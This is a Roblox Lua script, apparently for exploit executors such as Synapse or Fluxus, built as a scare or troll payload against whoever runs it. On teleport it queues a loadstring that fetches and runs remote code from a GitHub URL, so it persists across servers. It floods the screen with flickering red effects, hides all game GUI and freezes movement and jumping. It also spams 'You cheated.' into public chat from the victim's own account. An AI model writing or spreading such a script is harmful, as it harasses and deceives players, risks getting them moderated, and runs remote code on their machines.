queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

Lighting = game:GetService("Lighting")
ReplicatedStorage = game:GetService("ReplicatedStorage")
TextChatService = game:GetService("TextChatService")
Players = game:GetService("Players")
StarterGui = game:GetService("StarterGui")
GuiService = game:GetService("GuiService")
TeleportService = game:GetService("TeleportService")

Players.LocalPlayer.OnTeleport:Connect(function(State)
    if queueteleport then
        queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
    end
end)

LocalPlayer = Players.LocalPlayer
isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService

Red = Instance.new("ColorCorrectionEffect", Lighting)

coreGuiTypeNames = {
    Enum.CoreGuiType.Backpack,
    Enum.CoreGuiType.PlayerList,
    Enum.CoreGuiType.EmotesMenu
}

for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
    table.insert(coreGuiTypeNames, enumItem)
end

function chatMessage(str)
    str = tostring(str)
    if not isLegacyChat then
        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
    else
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
    end
end

function randstr(length)
    a = ''
    for i = 1, length do
        a = a .. utf8.char(math.random(50,2000))
    end
    return a
end

Red.Name = randstr(10)
Red.Enabled = true
Red.Saturation = -1
Red.Contrast = -2558222
Red.Brightness = -1555
Red.TintColor = Color3.fromRGB(255, 0, 0)

task.spawn(function()
    while task.wait(0.01) do
        for _, guiType in pairs(coreGuiTypeNames) do
            pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        Red.Brightness = math.random(-155555, -1555)
    end
end)

task.spawn(function()
    while task.wait() do
        Red.Contrast = math.random(-2558222, 2558222)
    end
end)

task.spawn(function()
    while task.wait() do
        Red.Saturation = math.random(-1, 0)
    end
end)

for i=1,3 do
    chatMessage('You cheated.')
end

task.spawn(function()
    while task.wait(12) do
        for i=1,3 do
            chatMessage('You cheated.')
        end
    end
end)

task.spawn(function()
    while task.wait(0.01) do
        Character = LocalPlayer.Character
        if Character then
            Character.Humanoid.WalkSpeed = 0
        end
    end
end)

task.spawn(function()
    while task.wait(0.01) do
        Character = LocalPlayer.Character
        Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Character and Humanoid then
            if Humanoid.UseJumpPower then
                Humanoid.JumpPower = 0
            else
                Humanoid.JumpHeight = 0
            end
        end
    end
end)
